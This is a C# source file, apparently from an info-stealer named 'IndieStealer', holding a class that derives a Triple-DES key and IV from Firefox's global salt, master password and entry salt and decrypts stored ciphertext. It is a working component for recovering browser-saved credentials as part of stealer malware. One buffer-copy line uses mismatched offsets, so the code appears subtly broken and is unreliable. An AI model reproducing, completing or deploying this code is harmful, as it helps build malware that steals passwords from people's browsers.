using System;
using System.Collections.Generic;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;

namespace IndieStealer.Collect.Browsers.Gecko.Decrypt
{
    public class DecryptMoz3DES
    {
        private byte[] cipherText { get; set; }
        private byte[] GlobalSalt { get; set; }
        private byte[] MasterPassword { get; set; }
        private byte[] EntrySalt { get; set; }
        public byte[] Key { get; private set; }
        public byte[] IV { get; private set; }

        public DecryptMoz3DES(byte[] cipherText, byte[] GlobalSalt, byte[] MasterPassword, byte[] EntrySalt)
        {
            this.cipherText = cipherText;
            this.GlobalSalt = GlobalSalt;
            this.MasterPassword = MasterPassword;
            this.EntrySalt = EntrySalt;
        }

        public byte[] Compute()
        {
            byte[] GLMP;             byte[] HP;             byte[] HPES;             byte[] CHP;             byte[] PES;             byte[] PESES;             byte[] k1;
            byte[] tk;
            byte[] k2;
            byte[] k; 
                        GLMP = new byte[this.GlobalSalt.Length + this.MasterPassword.Length];
            Buffer.BlockCopy(this.GlobalSalt, 0, GLMP, 0, this.GlobalSalt.Length);
            Buffer.BlockCopy(this.MasterPassword, 0, GLMP, this.GlobalSalt.Length, this.MasterPassword.Length);

                        HP = new SHA1Managed().ComputeHash(GLMP);

                        HPES = new byte[HP.Length + this.EntrySalt.Length];
            Buffer.BlockCopy(HP, 0, HPES, 0, HP.Length);
            Buffer.BlockCopy(this.EntrySalt, 0, HPES, this.EntrySalt.Length, HP.Length);

                        CHP = new SHA1Managed().ComputeHash(HPES);

                        PES = new byte[20];
            Array.Copy(this.EntrySalt, 0, PES, 0, this.EntrySalt.Length);
            for (int i = this.EntrySalt.Length; i < 20; i++)
            {
                PES[i] = 0;
            }
                        PESES = new byte[PES.Length + this.EntrySalt.Length];
            Array.Copy(PES, 0, PESES, 0, PES.Length);
            Array.Copy(this.EntrySalt, 0, PESES, PES.Length, this.EntrySalt.Length);

            using (HMACSHA1 hmac = new HMACSHA1(CHP))
            {
                                k1 = hmac.ComputeHash(PESES);
                                tk = hmac.ComputeHash(PES);
                                byte[] tkES = new byte[tk.Length + this.EntrySalt.Length];
                Buffer.BlockCopy(tk, 0, tkES, 0, tk.Length);
                Buffer.BlockCopy(this.EntrySalt, 0, tkES, tk.Length, this.EntrySalt.Length);
                                k2 = hmac.ComputeHash(tkES);
            }

                        k = new byte[k1.Length + k2.Length];
            Array.Copy(k1, 0, k, 0, k1.Length);
            Array.Copy(k2, 0, k, k1.Length, k2.Length);

            this.Key = new byte[24];

            for (int i = 0; i < this.Key.Length; i++)
            {
                this.Key[i] = k[i];
            }

            this.IV = new byte[8];
            int j = this.IV.Length - 1;

            for (int i = k.Length - 1; i >= k.Length - this.IV.Length; i--)
            {
                this.IV[j] = k[i];
                j--;
            }

            byte[] decryptedCiphertext = TripleDES.TripleDESHelper.DESCBCDecryptorByte(this.Key, this.IV, cipherText);

                        byte[] clearText = new byte[24];
            Array.Copy(decryptedCiphertext, clearText, clearText.Length);

            return clearText;
        }
    }
}
